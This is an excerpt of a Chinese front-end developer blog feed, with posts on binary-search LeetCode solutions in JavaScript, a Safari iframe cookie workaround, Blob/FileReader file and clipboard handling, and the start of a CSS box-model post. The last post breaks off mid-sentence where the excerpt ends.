href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/35.%E6%90%9C%E7%B4%A2%E6%8F%92%E5%85%A5%E4%BD%8D%E7%BD%AE.md" target="_blank" rel="noopener">35.搜索插入位置</a></td></tr></tbody></table><ol start="2"><li>用于旋转后的、二维的有序数组</li></ol><table><thead><tr><th>类型</th><th style="text-align:right">LeetCode题目</th></tr></thead><tbody><tr><td>旋转后的有序数组</td><td style="text-align:right"><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/33.%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84.md" target="_blank" rel="noopener">33.搜索旋转排序数组</a><br> <a href="">81.搜索旋转排序数组 II</a><br> <a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/33.%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84.md" target="_blank" rel="noopener">153.寻找旋转排序数组中的最小值</a></td></tr><tr><td>有序的二维数组</td><td style="text-align:right"><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/74.%E6%90%9C%E7%B4%A2%E4%BA%8C%E7%BB%B4%E7%9F%A9%E9%98%B5.md" target="_blank" rel="noopener">74.搜索二维矩阵</a></td></tr><tr><td>多个有序数组</td><td style="text-align:right"><a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/" target="_blank" rel="noopener">4.寻找两个正序数组的中位数</a></td></tr></tbody></table><ol start="3"><li>二分查找也适合用在“近似”查找问题</li></ol><p><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/69.x%20%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9.md" target="_blank" rel="noopener">69.x的平方根</a>、 <a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/367.%E6%9C%89%E6%95%88%E7%9A%84%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0.md" target="_blank" rel="noopener">367.有效的完全平方数</a></p><p><br></p><h3 id="4-例题"><a href="#4-例题" class="headerlink" title="4. 例题"></a>4. 例题</h3><p>下面是两条有代表性的，其他的点链接刷</p><h5 id="LeetCode-34-在排序数组中查找元素的第一个和最后一个位置"><a href="#LeetCode-34-在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="LeetCode 34.在排序数组中查找元素的第一个和最后一个位置"></a>LeetCode 34.在排序数组中查找元素的第一个和最后一个位置</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> binarySearch = <span class="function">(<span class="params">nums, target, lower</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>, right = nums.length - <span class="number">1</span>, ans = nums.length</span><br><span class="line">  <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">    <span class="keyword">const</span> mid = right + ((right - left) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="comment">// lower为true时，找最左一个位置，nums[mid] === target时，让right往下减，最后找到最左侧的索引</span></span><br><span class="line">    <span class="comment">// lower为false时，找最后一个位置, nums[mid] === target, 让left往上加，最后找到大于target的索引</span></span><br><span class="line">    <span class="keyword">if</span> (nums[mid] &gt; target || (lower &amp;&amp; nums[mid] &gt;= target))  &#123;</span><br><span class="line">      ans = mid</span><br><span class="line">      right = mid - <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      left = mid + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> searchRange = <span class="function">(<span class="params">nums, target</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [<span class="number">-1</span>, <span class="number">-1</span>]</span><br><span class="line">  <span class="keyword">const</span> leftIdx = binarySearch(nums, target, <span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">const</span> rightIdx = binarySearch(nums, target, <span class="literal">false</span>) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> (nums[leftIdx] === target &amp;&amp; nums[rightIdx] === target &amp;&amp; leftIdx &gt;= <span class="number">0</span> &amp;&amp; rightIdx &lt; nums.length) &#123;</span><br><span class="line">    ans = [leftIdx, rightIdx]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h5 id="LeetCode-69-x的平方根"><a href="#LeetCode-69-x的平方根" class="headerlink" title="LeetCode 69.x的平方根"></a>LeetCode 69.x的平方根</h5><p>计算并返回 x 的平方根，其中 x 是非负整数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查找近似问题</span></span><br><span class="line"><span class="comment">// y = x ^ 2, x &gt; 0时，抛物线在y轴右侧单调递增，且有上下界</span></span><br><span class="line"><span class="keyword">var</span> mySqrt = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (x === <span class="number">0</span> || x === <span class="number">1</span>) <span class="keyword">return</span> x</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">1</span>, right = x, mid = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">    <span class="comment">// &gt;&gt; 1 位运算代替 除2 取整 操作</span></span><br><span class="line">    mid = left + ((right - left) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> (mid * mid === x) &#123;</span><br><span class="line">      <span class="keyword">return</span> mid</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mid * mid &gt; x) &#123;</span><br><span class="line">      right = mid - <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      left = mid + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> right</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Set-Cookie失败</title>
      <link href="/2021/08/16/cookie%E4%BF%9D%E5%AD%98%E5%A4%B1%E8%B4%A5/"/>
      <url>/2021/08/16/cookie%E4%BF%9D%E5%AD%98%E5%A4%B1%E8%B4%A5/</url>
      <content type="html"><![CDATA[<h3 id="1-iframe里的Cookie"><a href="#1-iframe里的Cookie" class="headerlink" title="1. iframe里的Cookie"></a>1. iframe里的Cookie</h3><p>Safari 的安全策略太严格了，iframe 嵌套的网站的 cookie 被认为是不安全的，因此不允许保存，这就导致了用户即使在 iframe 中登录了网站，也无法保持登录状态，每次跳转页面之后就需要重新登录。</p><p>解决方法：<br>强行把 iframe 的父级页面跳转到子页面所在的网站，跳转时携带登录信息，后端设置好 cookie 后，再重定向到父级页面，这时候设置的 cookie 就被认为是安全的了。</p>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Blob, toBlob, FileReader 文件操作 &amp; 复制</title>
      <link href="/2021/08/16/copy/"/>
      <url>/2021/08/16/copy/</url>
      <content type="html"><![CDATA[<h3 id="1-Blob"><a href="#1-Blob" class="headerlink" title="1. Blob"></a>1. Blob</h3><p>Blob表示不可变的原始数据，可以是二进制数据或文本数据。</p><h4 id="1-1-下载文件"><a href="#1-1-下载文件" class="headerlink" title="1.1 下载文件"></a>1.1 下载文件</h4><p><em><code>new Blob()</code></em>创建一个Blob对象可以方便地将数据转换为文件形式，并通过<em><code>URL.createObjectURL</code></em>生成临时URL用于下载或显示。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'downloadBtn'</span>).addEventListener(<span class="string">'click'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> content = <span class="string">'这是一个通过Blob创建的文本文件。'</span>;</span><br><span class="line">  <span class="keyword">const</span> blob = <span class="keyword">new</span> Blob([content], &#123; <span class="attr">type</span>: <span class="string">'text/plain;charset=utf-8'</span> &#125;);</span><br><span class="line">  <span class="keyword">const</span> url = URL.createObjectURL(blob);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  a.href = url;</span><br><span class="line">  a.download = <span class="string">'example.txt'</span>;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">  a.click();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 释放URL对象</span></span><br><span class="line">  URL.revokeObjectURL(url);</span><br><span class="line">  <span class="built_in">document</span>.body.removeChild(a);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-上传文件"><a href="#1-2-上传文件" class="headerlink" title="1.2 上传文件"></a>1.2 上传文件</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'uploadBtn'</span>).addEventListener(<span class="string">'click'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> fileInput = <span class="built_in">document</span>.getElementById(<span class="string">'fileInput'</span>);</span><br><span class="line">  <span class="keyword">const</span> file = fileInput.files[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!file) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建FormData对象, 上传文件</span></span><br><span class="line">  <span class="keyword">const</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line">  formData.append(<span class="string">'image'</span>, file);</span><br><span class="line">  fetch(<span class="string">'https://example.com/upload'</span>, &#123;</span><br><span class="line">    method: <span class="string">'POST'</span>,</span><br><span class="line">    body: formData,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-3-大文件的分段下载"><a href="#1-3-大文件的分段下载" class="headerlink" title="1.3 大文件的分段下载"></a>1.3 大文件的分段下载</h4><p>大文件分段下载，跟大文件上传时要切片的初心一样，是为了“快”。利用 HTTP 请求头 <em><code>Range</code></em>控制下载片段，能够同时下载一个大文件的多个片段，然后组装起来，那将能够充分利用我们的网络资源，加速下载。<br>ps: 实现<em>暂停下载</em>，则是取消所有未完成的请求。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 并发分段下载</span></span><br><span class="line">axios.get(linkUrl, &#123;</span><br><span class="line">  headers: &#123;</span><br><span class="line">    Range: <span class="string">`bytes=<span class="subst">$&#123;start&#125;</span>-<span class="subst">$&#123;end&#125;</span>`</span>,</span><br><span class="line">    responseType: <span class="string">'blob'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并分段</span></span><br><span class="line"><span class="keyword">const</span> blobs = <span class="keyword">await</span> <span class="built_in">Promise</span>.all(tasks)</span><br><span class="line"><span class="keyword">const</span> blob = <span class="keyword">new</span> Blob(</span><br><span class="line">  blobs.map(<span class="function"><span class="params">blob</span> =&gt;</span> blob.data),</span><br><span class="line">  &#123; <span class="attr">type</span>: mime &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存为文件，见1.1 下载文件</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-toBlob"><a href="#2-toBlob" class="headerlink" title="2. toBlob"></a>2. toBlob</h3><p><code>HTMLCanvasElement.toBlob(callback, type, quality)</code> 方法创造 Blob 对象，用以展示 canvas 上的图片；这个图片文件可以被缓存或保存到本地。</p><ul><li><code>callback</code>: 回调函数，可获得一个单独的 Blob 对象参数</li><li><code>type</code>: string, 指定图片格式，默认为 image/png。<ul><li>text/plain - 纯文本文档</li><li>text/html - html文档</li><li>text/javascript - js文件</li><li>text/css - css文件</li><li>application/json - json文件</li><li>application/pdf - pdf文件</li><li>application/xml - xml文件</li><li>image/jpeg - jpeg图像</li><li>image/png - png图像</li><li>image/gif - gif图像</li><li>image/svg+xml - svg图像</li><li>audio/mpeg - mp3文件</li><li>video/mpeg - mp4文件</li></ul></li><li><code>quality</code>: Number 类型，值在 0 与 1 之间，当请求图片格式为 image/jpeg 或者 image/webp 时用来指定图片展示质量。</li><li><em><code>canvasHTMLElement.toBlob</code></em>可以用来实现复制效果<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copyBlob</span>(<span class="params">blob: Blob | null</span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!blob) <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">if</span> (!navigator.clipboard || !navigator.clipboard.write) <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">const</span> data = [<span class="keyword">new</span> ClipboardItem(&#123; [blob.type]: blob &#125;)]</span><br><span class="line">  navigator.clipboard.write(data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-1-复制-canvas-svg-为图片"><a href="#2-1-复制-canvas-svg-为图片" class="headerlink" title="2.1 复制 canvas / svg 为图片"></a>2.1 复制 canvas / svg 为图片</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getChartBlob</span>(<span class="params">title: string | null</span>): <span class="title">Promise</span>&lt;<span class="title">Blob</span> | <span class="title">null</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> chartDiv = <span class="built_in">document</span>.getElementById(<span class="string">`chart-container`</span>) <span class="keyword">as</span> HTMLElement</span><br><span class="line">    <span class="keyword">const</span> svgElement = chartDiv.querySelector(<span class="string">'svg'</span>) <span class="keyword">as</span> SVGElement</span><br><span class="line">    <span class="keyword">const</span> svgXML = <span class="keyword">new</span> XMLSerializer().serializeToString(svgElement)</span><br><span class="line">    <span class="keyword">const</span> chartWidth = svgElement.clientWidth * <span class="number">1.5</span></span><br><span class="line">    <span class="keyword">const</span> chartHeight = svgElement.clientHeight * <span class="number">1.5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新的canvas元素</span></span><br><span class="line">    <span class="keyword">const</span> canvas = <span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>) <span class="keyword">as</span> HTMLCanvasElement</span><br><span class="line">    <span class="keyword">const</span> context = canvas.getContext(<span class="string">'2d'</span>) <span class="keyword">as</span> CanvasRenderingContext2D</span><br><span class="line">    canvas.width = chartWidth + <span class="number">32</span></span><br><span class="line">    canvas.height = title</span><br><span class="line">      ? chartHeight + <span class="number">66</span> <span class="comment">// 图表标题占34px</span></span><br><span class="line">      : chartHeight + <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新的Image对象</span></span><br><span class="line">    <span class="keyword">const</span> image = <span class="keyword">new</span> Image()</span><br><span class="line">    image.src = <span class="string">'data:image/svg+xml;charset=utf8,'</span> + <span class="built_in">encodeURIComponent</span>(svgXML)</span><br><span class="line">    image.onload = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      context.fillStyle = <span class="string">'#fff'</span></span><br><span class="line">      context.fillRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height)</span><br><span class="line">      <span class="keyword">if</span> (title) &#123;</span><br><span class="line">        context.fillStyle = <span class="string">'rgba(13,13,13,0.9)'</span></span><br><span class="line">        context.font = <span class="string">'14px Arial'</span></span><br><span class="line">        <span class="keyword">const</span> textWidth = context.measureText(title).width</span><br><span class="line">        <span class="keyword">const</span> x = (canvas.width - textWidth) / <span class="number">2</span></span><br><span class="line">        context.fillText(title, x, <span class="number">30</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      context.drawImage(image, <span class="number">16</span>, title ? <span class="number">50</span> : <span class="number">16</span>, chartWidth, chartHeight)</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 将canvas图像转换为图片文件</span></span><br><span class="line">      canvas.toBlob(</span><br><span class="line">        <span class="keyword">async</span> blob =&gt; &#123;</span><br><span class="line">          <span class="keyword">return</span> resolve(blob)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'image/png'</span>,</span><br><span class="line">        <span class="number">0.5</span></span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制svg图表</span></span><br><span class="line"><span class="keyword">const</span> res = <span class="keyword">await</span> getChartBlob(<span class="string">'图表标题'</span>)</span><br><span class="line">copyBlob(res)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-2-复制-div-为图片"><a href="#2-2-复制-div-为图片" class="headerlink" title="2.2 复制 div 为图片"></a>2.2 复制 div 为图片</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> html2canvas <span class="keyword">from</span> <span class="string">'html2canvas'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getTableBlob</span>(<span class="params"></span>): <span class="title">Promise</span>&lt;<span class="title">Blob</span> | <span class="title">null</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="keyword">async</span> resolve =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> table = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'base-table'</span>)[<span class="number">0</span>] <span class="keyword">as</span> HTMLElement</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将图片数据URL放到粘贴板上</span></span><br><span class="line">    <span class="keyword">const</span> canvas = <span class="keyword">await</span> html2canvas(table)</span><br><span class="line">    canvas.toBlob(</span><br><span class="line">      <span class="keyword">async</span> blob =&gt; &#123;</span><br><span class="line">        resolve(blob)</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">'image/png'</span>,</span><br><span class="line">      <span class="number">0.9</span></span><br><span class="line">    )</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> res = <span class="keyword">await</span> getTableBlob()</span><br><span class="line">copyBlob(res)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-复制文本"><a href="#2-3-复制文本" class="headerlink" title="2.3 复制文本"></a>2.3 复制文本</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">copyText</span>(<span class="params">text: string</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> tempEl = <span class="built_in">document</span>.createElement(<span class="string">'textarea'</span>)</span><br><span class="line">  tempEl.value = text</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(tempEl)</span><br><span class="line">  tempEl.select()</span><br><span class="line">  <span class="built_in">document</span>.execCommand(<span class="string">'copy'</span>)</span><br><span class="line">  <span class="built_in">document</span>.body.removeChild(tempEl)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-FileReader"><a href="#3-FileReader" class="headerlink" title="3. FileReader"></a>3. FileReader</h3><h4 id="3-1-读取文件文本内容"><a href="#3-1-读取文件文本内容" class="headerlink" title="3.1 读取文件文本内容"></a>3.1 读取文件文本内容</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'textFileInput'</span>).addEventListener(<span class="string">'change'</span>, (event) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> file = event.target.files[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">const</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line"></span><br><span class="line">    reader.onload = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">'textContent'</span>).textContent = e.target.result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    reader.onerror = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      alert(<span class="string">'文件读取失败！'</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    reader.readAsText(file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-2-读取图片并预览"><a href="#3-2-读取图片并预览" class="headerlink" title="3.2 读取图片并预览"></a>3.2 读取图片并预览</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'imageFileInput'</span>).addEventListener(<span class="string">'change'</span>, (event) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> file = event.target.files[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (file &amp;&amp; file.type.startsWith(<span class="string">'image/'</span>)) &#123;</span><br><span class="line">    <span class="keyword">const</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line"></span><br><span class="line">    reader.onload = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">      img.src = e.target.result;</span><br><span class="line">      img.alt = <span class="string">'预览图片'</span>;</span><br><span class="line">      img.width = <span class="number">300</span>;</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">'imagePreview'</span>).appendChild(img);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    reader.onerror = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      alert(<span class="string">'图片加载失败！'</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    reader.readAsDataURL(file);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alert(<span class="string">'请选择一张图片文件。'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.cn/post/7444467218070323210?searchId=20241229213222203B42E54AFE0FF45949" target="_blank" rel="noopener">前端Blob、File、FileReader、ArrayBuffer傻傻分不清</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>盒模型、正常流、flex、移动端适配</title>
      <link href="/2021/08/16/%E7%9B%92%E6%A8%A1%E5%9E%8B/"/>
      <url>/2021/08/16/%E7%9B%92%E6%A8%A1%E5%9E%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-盒模型"><a href="#1-盒模型" class="headerlink" title="1. 盒模型"></a>1. 盒模型</h3><p>HTML标签中可以书写开始标签、结束标签和自封闭标签。一对起止标签，表示一个元素。DOM树中存储的是元素和其他类型的节点。CSS选择器选中的是<em>元素</em>。</p><p>元素在排版时可能产生多个<em>盒</em>。排版和渲染的基本单位是<em>盒</em>。一个元素可能会产生多个盒。如<em>inline</em>元素因为分行而产生多个盒。<em>被伪元素选中的元素</em>也会产生多个盒。</p><p>每个元素被表示为一个矩形的方框，框的内容、内边距、边界、外边距一层层构建起来。浏览器渲染网页布局时，会算出每个框每一层要用什么样式，以及框放在哪里。<br><em><code>box-sizing</code></em></p><ul><li>content-box：<code>element width = border + padding + content width</code></li><li>border-box：<code>element width = content width</code>(内容宽度包含了content width，border, padding, 建议使用)</li></ul><p><br></p><h3 id="2-正常流，BFC，IFC"><a href="#2-正常流，BFC，IFC" class="headerlink" title="2. 正常流，BFC，IFC"></a>2. 正常流，BFC，IFC</h3><p>HTML最早的排版设计，从文字出版行业的专家来做。思考一下，我们如何写字？1.从左到右书写； 2. 同一行写的文字都是对齐的；3. 一行写满了，就换到下一行。<strong>这也对应了正常流排版过程:</strong></p><ol><li>收集盒</li><li>计算盒在行中的排布<ul><li>行内盒遵循<em>IFC</em>(inline formatting contexts) 内联格式上下文<br>从左到右排列，排不下，放下一行。Baseline基线来决定行内元素如何对齐。</li><li>块状盒遵循<em>BFC</em>(Block formatting contexts) 块级格式上下文<br>从上到下依次排布。BFC合并会发生什么？<ul><li><em>clear 